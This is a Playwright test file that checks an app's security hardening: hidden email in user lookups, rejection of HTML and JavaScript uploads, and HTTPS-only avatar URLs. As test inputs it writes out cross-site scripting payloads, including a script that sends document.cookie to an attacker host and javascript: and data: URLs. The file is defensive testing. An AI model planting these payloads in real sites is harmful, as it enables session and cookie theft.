import { test, expect } from '../fixtures/test-fixtures';

test.describe('Security hardening', () => {

  // SEC-01 — Email must not appear in by-username response
  test.describe('SEC-01: GetByUsername does not expose email', () => {
    test('authenticated user cannot retrieve another user email via by-username lookup', async ({ api, userA, userB }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.get(`/api/users/by-username/${userB.username}`);
      expect(res.status(), await res.text()).toBe(200);

      const body = await res.json();
      expect(body).not.toHaveProperty('email');
      expect(body.username).toBe(userB.username);
      expect(body.id).toBe(userB.id);

      await ctx.dispose();
    });

    test('own email is still returned by /api/users/me', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.get('/api/users/me');
      expect(res.status(), await res.text()).toBe(200);

      const body = await res.json();
      expect(body.email).toBe(userA.email);

      await ctx.dispose();
    });
  });

  // SEC-03 — Blocked MIME types are rejected at upload
  test.describe('SEC-03: Dangerous MIME types are rejected on upload', () => {
    test('upload with text/html content type returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'page.html',
            mimeType: 'text/html',
            buffer: Buffer.from('<html><script>alert(1)</script></html>'),
          },
        },
      });
      expect(res.status()).toBe(400);
      const body = await res.json();
      expect(body.error).toContain('not permitted');

      await ctx.dispose();
    });

    test('upload with application/javascript content type returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'evil.js',
            mimeType: 'application/javascript',
            buffer: Buffer.from('fetch("https://attacker.com?c="+document.cookie)'),
          },
        },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('upload claiming image/jpeg but containing HTML returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'malicious.jpg',
            mimeType: 'image/jpeg',
            buffer: Buffer.from('<html><script>alert(1)</script></html>'),
          },
        },
      });
      expect(res.status()).toBe(400);
      const body = await res.json();
      expect(body.error).toContain('content does not match');

      await ctx.dispose();
    });

    test('upload of valid PNG file succeeds', async ({ api, userA }) => {
      const pngMagic = Buffer.from([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
        0xDE, 0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41,
        0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00,
        0x00, 0x00, 0x02, 0x00, 0x01, 0xE2, 0x21, 0xBC,
        0x33, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E,
        0x44, 0xAE, 0x42, 0x60, 0x82,
      ]);

      const ctx = await api.authContext(userA.accessToken);
      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: { name: 'pixel.png', mimeType: 'image/png', buffer: pngMagic },
        },
      });
      expect(res.status(), await res.text()).toBe(201);
      await ctx.dispose();
    });

    test('upload of text/plain document succeeds', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);
      const res = await ctx.post('/api/files/upload', {
        multipart: {
          file: {
            name: 'notes.txt',
            mimeType: 'text/plain',
            buffer: Buffer.from('Hello world'),
          },
        },
      });
      expect(res.status(), await res.text()).toBe(201);
      await ctx.dispose();
    });
  });

  // SEC-05 — Avatar URL scheme validation
  test.describe('SEC-05: Avatar URL must use HTTPS scheme', () => {
    test('PATCH /api/users/me with javascript: avatarUrl returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'javascript:alert(document.cookie)' },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('PATCH /api/users/me with data: avatarUrl returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'data:text/html,<script>alert(1)</script>' },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('PATCH /api/users/me with http: avatarUrl returns 400', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'http://insecure.example.com/avatar.png' },
      });
      expect(res.status()).toBe(400);

      await ctx.dispose();
    });

    test('PATCH /api/users/me with https: avatarUrl succeeds', async ({ api, userA }) => {
      const ctx = await api.authContext(userA.accessToken);

      const res = await ctx.patch('/api/users/me', {
        data: { avatarUrl: 'https://cdn.example.com/avatar.png' },
      });
      expect(res.status(), await res.text()).toBe(200);

      const body = await res.json();
      expect(body.avatarUrl).toBe('https://cdn.example.com/avatar.png');

      await ctx.dispose();
    });
  });
});
